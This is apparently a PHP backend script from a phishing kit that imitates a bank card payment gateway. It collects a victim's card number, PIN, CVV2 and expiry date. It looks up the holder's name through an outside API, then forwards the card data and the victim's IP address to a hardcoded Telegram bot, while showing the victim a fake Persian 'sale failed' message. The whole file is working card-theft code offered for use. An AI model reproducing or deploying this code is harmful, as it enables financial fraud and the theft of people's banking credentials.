<?php


/*************
CODED BY <! XKILER ! >
T.ME/X_KILER
CH/X_FISHING
*************/



if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}
header("Content-Type: application/json");

function getStringBetween($string, $start, $end)
{
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

$input       = file_get_contents("php://input");
$json        = json_decode($input, true);



$panchek = strlen($json["pan"]);
if($panchek=='16'){
$pan= $json["pan"];
}

$pinchek = strlen($json["pin"]);
if($pinchek=='5'||$pinchek=='6'||$pinchek=='7'||$pinchek=='8'||$pinchek=='9'||$pinchek=='10'||$pinchek=='11'||$pinchel=='12'){
$pin = $json["pin"];
}
$cvvchek = strlen($json["cvv2"]);
if($cvvchek=='3'||$cvvchek=='4'){
$cvv = $json["cvv2"];
}
	
$yearchek = strlen($json["expireYear"]);
if($yearchek=='2'){
$year = $json["expireYear"];
}
$monthchek = strlen($json["expireMonth"]);
if($monthchek=='2'){
$month = $json["expireMonth"];
}

if($json["email"]){
$email=htmlentities(strip_tags(htmlentities($json["email"])));
	
}else{
$email = "None";
}
$captchachek=strlen($json["captcha"]);
if($captchachek=='5'){
$captcha=$json["captcha"];
}




if(isset($pan)&&isset($pin)&&isset($cvv)&&isset($month)&&isset($year)&&isset($captcha)){

/** Coded By X_kiler **/
if($captcha=='64452'||$captcha=='78806'||$captcha=='65286'||$captcha=='76937'||$captcha=='89471'||$captcha=='82651'||$captcha=='41691'||$captcha=='99266'||$captcha=='85477'||$captcha=='93540'||$captcha=='95221'||$captcha=='51414'||$captcha=='93810'||$captcha=='99986'||$captcha=='81495'||$captcha=='25626'||$captcha=='56728'||$captcha=='05387'||$captcha=='59703'||$captcha=='04928'){
	
$get=json_decode(file_get_contents("https://api.xkilercode.tk/ApiCodes/name.php?card_number=$pan"),true);  
/********************************/
$status=$get['status'];
//Name Target 
$name=$get['Name'];
//Famil Target
$lastname=$get['Lastname'];
//Banke Cartesh
$bankname=$get['Bankname'];
/*********************************/
$holderName="$name$lastname";
if($status == "OK"){



include "functions.php";
include "time.php" ;

$paylimit = 3; 
$sendEmail = true;


$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);

function getUserIP(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$ip = getUserIP();




$TOKEN = "1471975521:AAGc8LtZbws3Xfv6PqkeFL23rDGBi975kz8";
$ID = 1457194403;

$Text = "
● #NewCard  $bankinfo[1]
-------------- CARD --------------
💳 Card : <code>$pan1$pan2$pan3$pan4</code>
🔐 Pass : <code>$pin</code>
📋 Cvv2 : <code>$cvv</code>
📆 Date : <code>$year</code>/<code>$month</code>

📍 $ip
";
	


if( (integer)$num > $paylimit){}else{

 file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));


}



}else{
Echo '{"status":"SALE_FAILED","responseCode":"11","description":"اطلاعات وارد شده صحيح نمي باشد"}' ;
}

}else{
Echo '{"status":"INVALID_CAPTCHA"}';
	
	}
	
	
	
	}else{
		
		
		
		
		
		}
/*************
CODED BY <! XKILER ! >
T.ME/X_KILER
CH/X_FISHING
*************/


?>
